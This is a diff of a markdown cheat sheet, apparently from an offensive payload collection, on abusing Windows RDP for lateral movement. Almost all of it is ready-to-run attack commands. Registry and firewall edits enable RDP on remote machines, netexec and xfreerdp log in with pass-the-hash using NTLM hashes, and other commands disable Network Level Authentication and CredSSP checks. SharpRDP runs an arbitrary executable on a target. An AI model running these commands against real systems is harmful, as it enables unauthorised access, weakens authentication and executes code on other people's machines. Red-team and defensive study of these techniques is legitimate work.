@@ -247,27 +247,49 @@ class RemoteShell(cmd.Cmd):
 
 :warning: **NOTE**: You may need to enable RDP and disable NLA and fix CredSSP errors.
 
-```powershell
-# Enable RDP
-PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
-PS C:\> netsh firewall set service remoteadmin enable
-PS C:\> netsh firewall set service remotedesktop enable
-# Alternative
-C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
-root@payload$ netexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+* Enable RDP
 
-# Fix CredSSP errors
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+    ```powershell
+    PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
+    PS C:\> netsh firewall set service remoteadmin enable
+    PS C:\> netsh firewall set service remotedesktop enable
 
-# Disable NLA
-PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
-PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
-```
+    # Alternative
+    C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+    root@payload$ netexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+    ```
+
+* Fix CredSSP errors
+
+    ```ps1
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+    ```
+
+**Network Level Authentication** requires the user to authenticate before a remote desktop session is fully established. This happens before the remote desktop interface is loaded, reducing the risk of certain attacks.
+
+* Take screenshot when NLA is disabled
+
+    ```ps1
+    netexec rdp 10.10.10.10 -u user -p pass --nla-screenshot
+    ```
+
+* Disable NLA
+
+    ```ps1
+    PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
+    PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
+    ```
 
 Abuse RDP protocol to execute commands remotely with the following commands;
 
-* `rdesktop`
+* [Pennyw0rth/netexec](https://github.com/Pennyw0rth/NetExec)
+
+    ```ps1
+    netexec rdp 10.10.10.10 -u user -p pass
+    ```
+
+* [rdesktop](http://www.rdesktop.org/)
 
     ```powershell
     root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
@@ -276,7 +298,7 @@ Abuse RDP protocol to execute commands remotely with the following commands;
     # -r disk:share : sharing a local folder during a remote desktop session 
     ```
 
-* `freerdp`
+* [freerdp](https://www.freerdp.com)
 
     ```powershell
     root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing
@@ -288,7 +310,7 @@ Abuse RDP protocol to execute commands remotely with the following commands;
     root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d  
     ```
 
-* [SharpRDP](https://github.com/0xthirteen/SharpRDP)
+* [0xthirteen/SharpRDP](https://github.com/0xthirteen/SharpRDP)
 
     ```powershell
     PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
